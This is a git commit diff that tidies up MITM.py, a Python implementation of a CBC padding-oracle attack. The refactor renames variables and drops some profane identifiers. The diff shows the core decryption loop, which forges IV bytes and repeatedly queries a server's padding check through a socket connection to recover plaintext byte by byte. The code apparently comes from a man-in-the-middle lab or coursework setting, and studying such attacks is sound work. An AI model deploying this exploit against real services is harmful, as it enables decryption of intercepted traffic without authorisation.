2d344a4359b934542342fbda6f6644da9f3715e7
Yip Jun Kai <yipjunkai@gmail.com>
2023-11-04 14:30:37 +0800

    cleaner

--- MITM.py
+++ MITM.py
@@ -18,7 +18,7 @@ logger = logging.getLogger(__name__)
 BLOCK_SIZE = AES.block_size
 
 
-def is_padding_ok(msg: bytes) -> bool:
+def check_against_server(msg: bytes) -> bool:
     proxy_server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
     proxy_server_socket.connect((SERVER_ADDRESS, SERVER_PORT))
@@ -49,62 +49,54 @@ def attack_data(ciphertext: bytes) -> bytes:
 
 
 def attack(ciphertext: bytes) -> bytes:
-    segment = [0] * 16
-    segment = bytearray(segment)
-
-    temp = [0] * 16
-    temp = bytearray(temp)
-
-    mod = [0] * 16
-    mod = bytearray(mod)
+    segment = bytearray([0] * 16)
+    temp = bytearray([0] * 16)
+    mod = bytearray([0] * 16)
 
     # split into 2 blocks
     # block0 XOR D(block1)= plaintext + padding
     block0 = ciphertext[:16]  # contains IV
-    block1 = ciphertext[16:32]  # contains plaintext +padding
+    block1 = ciphertext[16:32]  # contains plaintext + padding
 
-    mul = 0
+    multiplier = 0
 
     for index in tqdm(range(15, 0, -1), leave=False):
-        mul += 1
-        extrashit = b""
-        for fuck in tqdm(range(15, 15 - (mul - 1), -1), leave=False):
-            mod[fuck] = mul ^ temp[fuck]
-            extrashit = bytes([mod[fuck]]) + extrashit
+        multiplier += 1
+        extra_bytes = b""
+        for inner_index in tqdm(range(15, 15 - (multiplier - 1), -1), leave=False):
+            mod[inner_index] = multiplier ^ temp[inner_index]
+            extra_bytes = bytes([mod[inner_index]]) + extra_bytes
 
         for i in tqdm(range(1, 256), leave=False):
-            modified_block0 = block0[:-mul] + bytes([i]) + extrashit
+            modified_block0 = block0[:-multiplier] + bytes([i]) + extra_bytes
             modified_ciphertext = modified_block0 + block1
-            if is_padding_ok(modified_ciphertext):
+            if check_against_server(modified_ciphertext):
                 second_modified_block0 = (
-                    modified_block0[: -(mul + 1)]
+                    modified_block0[: -(multiplier + 1)]
                     + bytes([0xFF])
                     + modified_block0[index:]
                 )
                 test_correctness = second_modified_block0 + block1
-                if is_padding_ok(test_correctness):
+                if check_against_server(test_correctness):
                     break
-        # print(len(test_decrypt(modified_ciphertext)))
 
-        temp[index] = i ^ mul
+        temp[index] = i ^ multiplier
         element = int(block0[index])
         segment[index] = element ^ temp[index]
-        # print("Decoded char:" + chr(segment[index]))
-    # =======================================#
 
     # get first char
-    mul += 1
-    extrashit = b""
-    for fuck in range(15, 0, -1):
-        mod[fuck] = mul ^ temp[fuck]
-        extrashit = bytes([mod[fuck]]) + extrashit
+    multiplier += 1
+    extra_bytes = b""
+    for inner_index in range(15, 0, -1):
+        mod[inner_index] = multiplier ^ temp[inner_index]
+        extra_bytes = bytes([mod[inner_index]]) + extra_bytes
     for i in range(1, 256):
-        modified_block0 = bytes([i]) + extrashit
+        modified_block0 = bytes([i]) + extra_bytes
         modified_ciphertext = modified_block0 + block1
-        if is_padding_ok(modified_ciphertext):
+        if check_against_server(modified_ciphertext):
             break
 
-    temp[0] = i ^ mul
+    temp[0] = i ^ multiplier
     element = int(block0[0])
     segment[0] = element ^ temp[0]
 
